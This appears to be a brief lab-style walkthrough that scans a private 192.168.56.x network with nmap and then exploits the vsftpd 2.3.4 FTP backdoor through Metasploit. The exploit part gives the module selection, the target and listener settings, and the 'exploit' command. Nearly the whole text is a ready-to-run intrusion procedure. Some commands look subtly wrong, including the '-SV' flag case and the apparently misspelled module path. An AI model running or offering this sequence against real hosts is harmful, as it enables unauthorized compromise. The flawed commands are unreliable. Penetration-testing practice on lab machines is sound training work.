# Find the vurnable system by scanning network using nmap

$ nmap -sn 192.168.56.0/24
$ # Get a list of networks ,note them down
$ # Suppose we got networks like 192.168.56.10, 192.168.56.20, 192.168.56.100 & 192.168.56.1
$ # Find the open ports, services across the networks
$ nmap -SV 192.168.56.1
$ nmap -SV 192.168.56.10
$ nmap -SV 192.168.56.20
$ nmap -SV 192.168.56.100
$ # will get a lists of open ports and services for each network
$ # To exploit the ftp backdoor, we are using vsftpd 2.3.4
$ # Now, to make exploit, go msfconsole
$ clear
$ msfconsole
$ # It will take us to the msfconsole

# Inside msfconsole
 
$ use exploit/unix/ftp/vsftp_234_backdoor
$ # It will enter to exploit file location, now from there, give this commands
# Set Remote host for attack
# Set the port to attack, found from shell
# Set the local host, which will perform attack
# Start the exploit

$ show options
$ set RHOST 192.168.56.20
$ set RPORT 21
$ set LHOST 192.168.56.10
$ exploit

